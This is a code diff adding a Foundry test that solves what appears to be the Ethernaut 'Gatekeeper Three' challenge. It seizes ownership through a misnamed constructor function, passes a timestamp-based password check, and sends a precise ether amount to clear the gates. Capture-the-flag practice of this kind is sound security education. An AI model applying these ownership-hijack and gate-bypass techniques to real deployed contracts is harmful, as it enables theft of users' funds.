@@ -1,17 +1,43 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
 
-// import "forge-std/Test.sol";
-// import "../utils.sol";
+import "forge-std/Test.sol";
 
-// contract GatekeeperThreeTest is Test {
-//   address internal challengeAddress;
+// Ditto both gatekeepers (checking tx.origin)
+interface IFactory {
+  function createInstance(address _player) external payable returns (address);
+  function validateInstance(address payable _instance, address _player) external returns (bool);
+}
 
-//   function setUp() public {
-//     challengeAddress = utils.createLevelInstance(0x762db91C67F7394606C8A636B5A55dbA411347c6);
-//   }
+interface IGatekeeperThree {
+  function construct0r() external;
+  function createTrick() external;
+  function getAllowance(uint256) external;
+  function enter() external returns (bool);
+}
 
-//   function testExploit() public {
-//     // utils.submitLevelInstance(challengeAddress);
-//   }
-// }
+contract GatekeeperThreeTest is Test {
+  IFactory internal challengeFactory;
+  address internal challengeAddress;
+
+  function setUp() public {
+    challengeFactory = IFactory(0x762db91C67F7394606C8A636B5A55dbA411347c6);
+    challengeAddress = challengeFactory.createInstance(tx.origin);
+  }
+
+  function testExploit() public {
+    IGatekeeperThree gatekeeperThree = IGatekeeperThree(challengeAddress);
+
+    gatekeeperThree.construct0r();
+
+    gatekeeperThree.createTrick();
+    gatekeeperThree.getAllowance(block.timestamp);
+
+    (bool result,) = challengeAddress.call{value: 0.001000000000000001 ether}("");
+    result;
+
+    gatekeeperThree.enter();
+
+    require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
+  }
+}
